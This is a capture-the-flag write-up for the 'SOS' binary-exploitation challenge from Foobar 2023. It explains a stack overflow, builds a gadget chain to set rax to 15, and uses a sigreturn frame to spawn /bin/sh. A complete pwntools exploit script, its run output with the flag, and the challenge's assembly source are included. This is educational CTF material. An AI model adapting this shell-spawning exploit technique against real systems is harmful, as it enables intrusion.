# SOS - Foobar 2023

The binary has no protection mechanisms enabled.

```
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
 ```
Futher, the binary has a stack-based buffer overflow that allows us to place our malicious gadgets directly on top of the stack, which will then be called once the main function callses at ``0x0040102f``.

```
00401000  b801000000         mov     eax, 0x1
00401005  bf01000000         mov     edi, 0x1
0040100a  48be002040000000…mov     rsi, msg  {"Please Sav"}
00401014  ba09000000         mov     edx, 0x9
00401019  0f05               syscall 
0040101b  b800000000         mov     eax, 0x0
00401020  4889e6             mov     rsi, rsp {__return_addr}
00401023  bf00000000         mov     edi, 0x0
00401028  ba90010000         mov     edx, 0x190
0040102d  0f05               syscall 
0040102f  c3                 retn     {__return_addr}
```

However, there are few few usable gadgets in the binary. 

```
0x0000000000401030: shl rax, 1; ret; 
0x000000000040103d: xor rax, rax; ret; 
0x0000000000401034: mov ecx, 1; xor rax, rcx; ret
0x0000000000401019: syscall; 
```

``SROP`` seems like a viable exploit technique since we can control ``RAX`` and have access to a ``syscall`` instruction.

We can use the ``shlr rax, 1`` and ``mov ecx, 1; xor rax, rcx;`` instruction to set rax=15, essentially performing the following operations ``((((((1*2) xor 1)*2) xor 1)*2)+1)==15``. Well go ahead and build a ``set_rax_15()`` chain that does this.


```python
def set_rax_15():
    xrxr = 0x40103d
    xor1 = 0x401034
    shl1 = 0x401030

    chain = p64(xrxr)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    return chain
```

After that all we need to do is trigger a ``sigreturn`` by calling ``syscall``. The ``sigreturn`` syscall will restore the state of the registers from a ``SigreturnFrame``. So well go ahead and develop a sigreturn frame that sets up up for an execve() syscall by setting ``rax=0x3b``, ``rdi=0x40200b (address of /bin/sh)``, and ``rsi=rdx=0x0=NULL``. Further we'll ``RIP=syscall``, which will trigger  ``execve('/bin/sh',NULL,NULL)``

```python
def srop_frame():
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = 0x40200b
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall
    return bytes(frame)
```

Putting it all together, our exploit looks like:

```python
from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.170.55.8', 1337)
    else:
        return process(e.path, level='error')


p = start()
syscall = 0x40102d

'''((((((1*2)+1)*2)+1)*2)+1)'''
def set_rax_15():
    xrxr = 0x40103d
    xor1 = 0x401034
    shl1 = 0x401030

    chain = p64(xrxr)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    return chain


def srop_frame():
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = 0x40200b
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall
    return bytes(frame)


chain = set_rax_15()
chain += p64(syscall)
chain += srop_frame()
p.sendline(chain)
p.interactive()
```

Throwing our exploit at the REMOTE server, we get the flag ``GLUG{TH4nKS_f0R_ReSp0ND1nG_7O_my_SiGNA1}``. 

```
└─# python3 pwn-sos.py BIN=./chall REMOTE
[*] '/root/workspace/foobar/sos/chall'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to 34.170.55.8 on port 1337: Done
[*] Switching to interactive mode
Please Sa$ cat flag.txt
GLUG{TH4nKS_f0R_ReSp0ND1nG_7O_my_SiGNA1}
```

The challenge authors also left the challenge source code on the remtoe server as well.


```s
global _start

section .text

__start:
_start:
  mov rax, 1        
  mov rdi, 1        
  mov rsi, msg      
  mov rdx, 9  
  syscall

  mov rax, 0
  mov rsi, rsp
  mov rdi, 0
  mov rdx, 400
  syscall
  ret

  shl rax, 1
  ret

  mov rcx, 1
  xor rax, rcx
  ret

  xor rax, rax
  ret

section .data
  msg: db "Please Sav", 0
  sh: db "/bin/sh", 0
```